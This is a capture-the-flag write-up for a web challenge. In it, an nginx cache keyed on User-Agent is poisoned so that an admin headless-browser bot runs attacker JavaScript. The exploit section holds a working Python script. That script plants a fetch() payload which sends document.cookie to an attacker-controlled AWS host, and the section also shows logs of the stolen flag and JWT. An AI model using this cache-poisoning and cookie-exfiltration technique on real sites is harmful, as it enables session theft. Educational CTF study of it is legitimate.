# ai-government-complaint-form

[library.m0unt41n.ch/challenges/ai-government-complaint-form](https://library.m0unt41n.ch/challenges/ai-government-complaint-form) ![](../../resources/web.svg) ![](../../resources/medium.svg) 

# TL;DR

We inject user-specific malicious JS which, thanks to over-zealous cache,
is picked by pyppeteer-driven Chrome browser, logged-in with admin credentials.

# Setup

First, some fixes and extra tools in the container:

```bash
$ chmod a+x app/start.sh app/bot.py
$ sed -i 's/80:80/8080:80/' docker-compose.yml
$ sed -i '/cron/a\\nRUN apt-get install -y sqlite3 vim wget tcpdump procps' app/Dockerfile
```

With that, we can launch and get a shell inside

```bash
$ docker compose up
$ docker container exec -ti $(docker ps -ql --filter "ancestor=ai-government-complaint-form-web") /bin/bash
```

# App components

## `nginx` at port 80

Simple, caching proxy, listening on port 80 and proxying requests to the web server (below):

```
proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=60m use_temp_path=off;
server {
  listen 80;
  location / {
    proxy_cache my_cache;
    proxy_pass http://web:5000;
    proxy_cache_key "$scheme$request_method$request_uri$http_user_agent";
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
  }
}
```

Note the `proxy_cache_key`, will be important later.

## `web` server at port 5000

A simple Flask app, with a DB of users. Apart from user ID, name and password
(precisely: hexdigest of its SHA256), it also stores a piece of JS.
Authentication is a generic JWT-based token, with a random secret key generated
at start. No obvious weakness there.

The endpoints are:

*   `GET /` - login page
*   `GET /register` - registration form
*   `POST /register` - takes `username` and `password` from the registration form, tries to create user and generate `authorization` cookie.
*   `GET /login` - login form
*   `POST /login` - takes `username` and `password`, checks against DB, if successful, generates `authorization` cookie.
*   `GET /dashboard` - main dashboard
*   `GET /notify_ai` - executes `bot.py` (see below)
*   `POST /scripts/user.js` - updates the JS in DB for currently logged-in user with the value of  `js` param
*   `GET /scripts/user.js` - retrieves JS for currently logged-in user
*   `POST /send` - seems no-op, returns a fixed string at best
*   `GET /faq` - evals `faq.txt` as a Python expression and returns the result

Main template is `dashboard.html`, used by all endpoints except `/login` and
`/register`, that use `login.html`. There is also `bot.html`, seemingly not
used.

There seems to be no app functionality that would use `POST /scripts/user.js`, but we can still
trigger it manually.

## `bot.py`

Simple, one-shot [pyppeteer](https://github.com/pyppeteer/pyppeteer) run, which:

*   Launches a headless browser
*   Sets `User-Agent` to `/mnt/ain CTF bot`
*   Sets `flag` cookie to the value from `flag.txt`
*   Logins as `ai` (first, preconfigured user, stored in `password.txt`)
*   Loads the `/dashboard` from nginx.
*   Loads `/scripts/user.js` from nginx.

Now, important bit: **`dashboard.html` runs `/scripts/user.js`**:

```html
<script src="/scripts/user.js"></script>
```

Which means that if we can change the JS executed by the bot, we will have the flag in the cookie there!

# Exploit

The most important component here is the nginx cache. It is used by the bot and seems oblivious to
authentication. So, if we can poison that cache with our own JS, the bot will load it, instead of
fetching it from the DB.

So, the overall idea of the attack:

*   Start a separate `python3 -m http.server 80` somewhere (AWS instance)
*   Create a user
*   Update that user's JS to something that would pull the flag from the cookie and send it to the HTTP server
    (can be a dummy GET, with cookie as part of the URL, that we'll pick from server logs)
*   `GET /scripts/user.js` to poison the cache
*   Call the bot - hope that it will get our JS and run the code.

This assumes that the remote instance will have access to the internet. But, there is a hint that
this might be the case: additional `make_download_shit.py` which starts at boot and loads
[http://example.com](http://example.com) - with UA set to `/mnt/ain CTF bot`, no less.

The exploit code:

```python
import requests

URL="http://localhost:8080"
AWS_URL="http://ec2-12-34-123-45.compute-1.amazonaws.com"

s = requests.Session()
s.headers.update({"User-Agent": "/mnt/ain CTF bot"})

s.post(URL+"/register", data={"username": "testuser", "password": "testpassword"})
s.post(URL+"/login", data={"username": "testuser", "password": "testpassword"})
s.post(URL+"/scripts/user.js", data={"js": "fetch('"+AWS_URL+"/'+encodeURIComponent(document.cookie));"})
s.get(URL+"/scripts/user.js")
s.get(URL+"/notify_ai")
```

Testing this against the local Docker container, we see a promising entry in the HTTP server log:

```
xxx.xxx.xxx.xxx - - [01/Dec/2024 19:06:41] "GET /flag%3Dcyberskills23%7Bfake_flag%7D%3B%20authorization%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZXhwIjoxNzMzMDgxODAwfQ.MY0oQtCYesFj2O9Vmtdj70iDW71M7AaFWq1axvcmZ8M HTTP/1.1" 404 -
```

And finally, against the remote instance:

```python
URL="https://591e7dbf-03c5-4aa7-ac9e-a653132d14fc.library.m0unt41n.ch:31337"
```

... we get the flag:

```
yyy.yyy.yyy.yyy - - [01/Dec/2024 19:10:42] "GET /flag%3Dcyberskills23%7BG0v3rnm3nts_b3ing_G0v3rnm3nts%7D%3B%20authorization%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZXhwIjoxNzMzMDgyMDQxfQ.Xs4e_XWQtJiRydcrSFyAPyh9a3fOHJzZGrnjnRhpRLg HTTP/1.1" 404 -
```

---

## `cyberskills23{G0v3rnm3nts_b3ing_G0v3rnm3nts}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
